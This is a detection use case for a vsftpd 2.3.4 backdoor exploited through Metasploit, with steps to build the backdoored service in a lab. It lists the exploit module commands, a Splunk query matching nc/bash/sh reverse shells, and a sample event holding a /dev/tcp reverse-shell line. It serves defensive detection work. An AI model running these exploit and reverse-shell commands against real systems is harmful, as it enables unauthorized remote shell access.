
# Detection Use Case: Exploiting vsftpd 2.3.4 via Metasploit

## 🧪 Scenario Description
An attacker exploits a known backdoor in vsftpd version 2.3.4 using the Metasploit Framework. The vsftpd 2.3.4 vulnerability allows an attacker to obtain a reverse shell by connecting with a specially crafted username.

## 🎯 Objective
Detect the exploitation attempt and subsequent reverse shell activity, especially focusing on unexpected shell access initiated through FTP service ports (usually 21) or reverse shell callbacks.

## 🛠️ Tools & Setup
- **Offensive Tool**: Metasploit
  - Module: `exploit/unix/ftp/vsftpd_234_backdoor`
- **Detection Tools**: 
  - Netcat listener
  - SIEM (e.g., Splunk, ELK, Wazuh)
- **Lab Environment**:
  - Vulnerable target with vsftpd 2.3.4
  - Attacker system with Metasploit installed
  - SIEM monitoring on network and host events

## ⚙️ Steps to Set Up the Backdoored vsftpd 2.3.4

### Clone the Repository
```bash
git clone https://github.com/DoctorKisow/vsftpd-2.3.4.git
cd vsftpd-2.3.4
```

### Install Dependencies
```bash
sudo apt-get update
sudo apt-get install build-essential libpam0g-dev
```

### Build the vsftpd Binary
```bash
chmod +x vsf_findlibs.sh
nano Makefile
```
In the `Makefile`, add `-lpam` to the `LIBS` line, then save and exit.

```bash
make
```

### Install the vsftpd Binary
```bash
sudo install -v -m 755 vsftpd /usr/sbin/vsftpd
sudo install -v -m 644 vsftpd.conf /etc/vsftpd.conf
```

### Start the vsftpd Service
```bash
sudo /usr/sbin/vsftpd /etc/vsftpd.conf
```

## 📡 Detection Logic
Monitor for:
- Connection attempts to FTP (port 21) with suspicious usernames (e.g., those ending with `:)`).
- Unexpected outbound connections from the target system to uncommon external IPs/ports, indicating a reverse shell.
- New bash processes spawned without user interaction.
- Netcat (nc), bash, or sh running with suspicious parent processes like vsftpd.

## 🧪 Metasploit Usage
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target-ip>
run
```

## 🔍 Detection Queries (Sample Splunk SPL)
```spl
index=linux_logs sourcetype=syslog
| rex field=_raw "<Data Name=\"CommandLine\">(?<CommandLine>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"ParentImage\">(?<ParentImage>[^<]+)</Data>"
| eval is_reverse_shell=if(match(CommandLine, "(nc|bash|sh).*\\d+\.\\d+\.\\d+\.\\d+"), 1, 0)
| eval is_vsftpd_spawn=if(like(ParentImage, "%vsftpd%") AND is_reverse_shell=1, 1, 0)
| where is_vsftpd_spawn=1
| table _time host CommandLine ParentImage
```

## 📁 Log Fields to Monitor
| Field        | Description                                      |
|--------------|--------------------------------------------------|
| _time        | Timestamp of the event                           |
| host         | Affected system hostname                         |
| CommandLine  | Command used to spawn reverse shell              |
| ParentImage  | Process that initiated the command (e.g., vsftpd)|

## ⚠️ Alert
**Trigger Condition**: Reverse shell initiated by the vsftpd process or any suspicious connection after vsftpd service interaction.

## 🧪 Sample Event
```text
_time: 2025-05-23T16:01:34
host: vulnerable-ftp
CommandLine: bash -i >& /dev/tcp/10.0.0.15/4444 0>&1
ParentImage: /usr/sbin/vsftpd
```

## 🕵️ Analyst Notes / Recommendations
- Verify if vsftpd version is vulnerable and exposed.
- Validate if the shell access was authorized or unexpected.
- Consider isolating the system and performing forensics.
- Patch or disable vsftpd 2.3.4 immediately.

## 🔗 MITRE ATT&CK Mapping
| Technique ID  | Technique Name                | Description                                           |
|---------------|-------------------------------|-------------------------------------------------------|
| T1190         | Exploit Public-Facing Application | Exploiting vulnerable vsftpd service                |
| T1059.004     | Command and Scripting Interpreter: Unix Shell | Use of bash for reverse shell access         |
| T1071.001     | Application Layer Protocol: Web | Reverse shell callback using TCP (bash/nc)           |
| T1049         | System Network Connections Discovery | Used for post-exploitation lateral movement planning |

---

✅ **Status**: Tested in a lab setup with Splunk and Metasploit. Reverse shell detection confirmed using command-line logs and parent process analysis.
